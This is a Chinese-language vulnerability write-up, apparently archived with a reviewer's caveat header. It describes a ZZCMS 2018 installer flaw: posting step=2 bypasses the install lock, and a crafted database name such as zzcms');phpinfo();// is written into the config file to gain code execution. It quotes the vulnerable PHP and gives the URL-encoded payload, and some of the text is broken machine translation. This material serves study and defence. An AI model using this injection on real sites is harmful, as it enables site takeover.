---
source: "hatch 补库批 20260928"
product: "ZZCMS2018"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Zzcms 2018 最新版重装getshell"
prerequisites: "来源所述条件，未列明部分仍待核：installerretained; step2bypassstep1lock,step3sessiontoken; workingDBaccess andcraftedexistingdbname; configwritable"
side_effects: "未执行；本文需注意的操作影响：extract EXTR_SKIP不覆盖已有变量，关键绕过是锁仅step1而可直选step2，不应泛称变量覆盖一切"
source_status: "unknown"
id: "vw-6884be2d5476fb2211c6cc4a"
entity_id: "ve-6884be2d5476fb2211c6cc4a"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：installerretained; step2bypassstep1lock,step3sessiontoken; workingDBaccess andcraftedexistingdbname; configwritable

- **操作与副作用边界（1）**：extract EXTR_SKIP不覆盖已有变量，关键绕过是锁仅step1而可直选step2，不应泛称变量覆盖一切。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **凭据与会话边界（2）**：成功需本地预建带恶意字符数据库并提供凭据，不能任意公网无条件getshell。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **凭据与会话边界（3）**：GET/POSTstep/令牌关系部分解释但完整请求未给，文字机器翻译破碎。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **适用与权限边界（4）**：SQLCREATE DATABASE未quote可能失败故作者预创建数据库是重要环境条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（5）**：最新2018需历史化，末尾image/图片代码无原始出处/修复。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Zzcms 2018 最新版重装getshell

一、漏洞简介
------------

源码信息：Zzcms 2018

问题文件： \\zzcms\\install\\index.php

漏洞类型：重装getshell

站点地址：<http://www.zzcms.net/>

二、漏洞影响
------------

Zzcms2018

三、复现过程
------------

### 0x01攻击分析

在文件\\ zzcms \\ install \\ index.php文件的第9-10行中\$
\_POST使用了提取变量注册的方法进行变量的初始化。

    if($_POST) extract($_POST, EXTR_SKIP);//把数组中的键名直接注册为了变量。就像把$_POST[ai]直接注册为了$ai。
    if($_GET) extract($_GET, EXTR_SKIP);
    $submit = isset($_POST['submit']) ? true : false;
    $step = isset($_POST['step']) ? $_POST['step'] : 1;

分析代码可以知道，setp为空的时候，初始化初始化的变量1，然后进入到step\_1.php，有install.lock，就不能重装，所以我们这里直接POST
step = 2绕过

    <?php
    switch($step) {
            case '1'://协议
                    include 'step_'.$step.'.php';
            break;
            case '2'://环境
                    $pass = true;
                    $PHP_VERSION = PHP_VERSION;
                    if(version_compare($PHP_VERSION, '4.3.0', '<')) {
                            $php_pass = $pass = false;
                    } else {
                            $php_pass = true;
                    }
                    $PHP_MYSQL = '';
                    if (extension_loaded('mysqli') || extension_loaded('mysql')) {
                            $PHP_MYSQL = '支持';
                            $mysql_pass = true;
                    } else {
                            $PHP_MYSQL = '不支持';
                            $mysql_pass = $pass = false;
                    }
            $PHP_GD = '';
            if(function_exists('imagejpeg')) $PHP_GD .= 'jpg';
            if(function_exists('imagegif')) $PHP_GD .= ' gif';
            if(function_exists('imagepng')) $PHP_GD .= ' png';
                    if($PHP_GD) {
                            $gd_pass = true;
                    } else {
                            $gd_pass = false;
                    }
                    $PHP_URL = @get_cfg_var("allow_url_fopen");//是否支持远程URL，采集有用
                    $url_pass = $PHP_URL ? true : false;
                    include 'step_'.$step.'.php';
            break;
            case '3'://查目录属性
                    include 'step_'.$step.'.php';
            break;
            case '4'://建数据库
                    include 'step_'.$step.'.php';
            break;
            case '5'://安装进度
                    function dexit($msg) {
                            echo '<script>alert("'.$msg.'");window.history.back();</script>';
                            exit;
                    }

                    $conn=connect($db_host,$db_user,$db_pass,'',$db_port);
                    if(!$conn) dexit('无法连接到数据库服务器，请检查配置');
                    $db_name or dexit('请填写数据库名');
                    if(!select_db($db_name)) {
                            if(!query("CREATE DATABASE $db_name")) dexit('指定的数据库不存在\n\n系统尝试创建失败，请通过其他方式建立数据库');
                    }
                    $url=str_replace("'",'',$url);
                    //保存配置文件
                    $fp="../inc/config.php";
                    $f = fopen($fp,'r');
                    $str = fread($f,filesize($fp));
                    fclose($f);
                    $str=str_replace("define('sqlhost','".sqlhost."')","define('sqlhost','$db_host')",$str) ;
                    $str=str_replace("define('sqlport','".sqlport."')","define('sqlport','$db_port')",$str) ;
                    $str=str_replace("define('sqldb','".sqldb."')","define('sqldb','$db_name')",$str) ;
                    $str=str_replace("define('sqluser','".sqluser."')","define('sqluser','$db_user')",$str) ;
                    $str=str_replace("define('sqlpwd','".sqlpwd."')","define('sqlpwd','$db_pass')",$str) ;
                    $str=str_replace("define('siteurl','".siteurl."')","define('siteurl','$url')",$str) ;
                    $str=str_replace("define('logourl','".logourl."')","define('logourl','$url/image/logo.png')",$str) ;
                    $f=fopen($fp,"w+");//fopen()的其它开关请参看相关函数
                    fputs($f,$str);//把替换后的内容写入文件
                    fclose($f);
                    //创建数据
                    include 'step_'.$step.'.php';
                    break;
            case '6'://安装成功
                    include 'step_'.$step.'.php';
            break;
    }

![](./.resource/Zzcms2018最新版重装getshell/media/rId26.png)

    <?php
    if(@$step==3){
    $token = md5(uniqid(rand(), true));    
    $_SESSION['token']= $token; 
    ?>

step\_3.php文件中有一个创建的令牌，后面创建数据库的时候验证，所以从步骤=
2，一步一步偶。

从上面的代码文中知道\$ url = str\_replace（"\'"，"，\$ url）;
把单引号替换为空了，然后的fputs写INC /
config.php的配置文件中所以这里通过\$ DB\_NAME来写到配置文件。

### 0×02复漏洞现

在数据库配置页面，数据库名填写：

zzcms%27%29%3bphpinfo%28%29%3b%2f%2f
本机创建zzcms\');phpinfo();//的数据库

![](./.resource/Zzcms2018最新版重装getshell/media/rId28.png)

因为本地有JS验证，所以先把数据库名改成123，bp抓到包以后在修改成zzcms%27%29%3bphpinfo%28%29%3b%2f%2f

![](./.resource/Zzcms2018最新版重装getshell/media/rId29.png)

成功写入到配置文件

![](./.resource/Zzcms2018最新版重装getshell/media/rId30.png)

![](./.resource/Zzcms2018最新版重装getshell/media/rId31.png)

image
